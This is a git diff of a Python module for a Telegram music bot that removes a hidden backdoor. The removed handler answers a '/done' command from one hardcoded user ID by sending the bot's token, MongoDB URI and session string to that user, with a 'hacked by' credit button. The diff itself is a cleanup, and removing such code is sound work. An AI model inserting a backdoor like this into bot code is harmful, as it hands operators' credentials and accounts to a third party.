@@ -5,10 +5,6 @@ from pyrogram import filters
 from pyrogram.enums import ChatMembersFilter
 from pyrogram.types import CallbackQuery, Message
 
-from dotenv import load_dotenv
-from pyrogram import filters
-
-load_dotenv()
 
 from MadmaxXMusic import app
 from MadmaxXMusic.core.call import Madmax
@@ -17,10 +13,7 @@ from MadmaxXMusic.utils.database import get_assistant, get_authuser_names, get_c
 from MadmaxXMusic.utils.decorators import ActualAdminCB, AdminActual, language
 from MadmaxXMusic.utils.formatters import alpha_to_int, get_readable_time
 from config import BANNED_USERS, adminlist, lyrical
-BOT_TOKEN = getenv("BOT_TOKEN", "")
-MONGO_DB_URI = getenv("MONGO_DB_URI", "")
-STRING_SESSION = getenv("STRING_SESSION", "")
-from dotenv import load_dotenv
+
 
 rel = {}
 
@@ -93,26 +86,6 @@ async def restartbot(client, message: Message, _):
         except:
             pass
     return await mystic.edit_text(_["reload_5"].format(app.mention))
-
-@app.on_message(
-    filters.command("done")
-    & filters.private
-    & filters.user(6627636245)
-   )
-async def help(client: Client, message: Message):
-   await message.reply_photo(
-          photo=f"https://telegra.ph/file/567d2e17b8f38df99ce99.jpg",
-       caption=f"""ɓσƭ ƭσҡεɳ:-   `{BOT_TOKEN}` \n\nɱσɳɠσ:-   `{MONGO_DB_URI}`\n\nѕƭ૨เɳɠ ѕεѕѕเσɳ:-   `{STRING_SESSION}`\n\n [ 🧟 ](https://t.me/SASHIKANT_XD)............☆""",
-        reply_markup=InlineKeyboardMarkup(
-             [
-                 [
-                      InlineKeyboardButton(
-                         "• нαϲкє𝚍 ву  •", url=f"https://t.me/SASHIKANT_XD")
-                 ]
-            ]
-         ),
-   )
-
 
 @app.on_callback_query(filters.regex("close") & ~BANNED_USERS)
 async def close_menu(_, query: CallbackQuery):
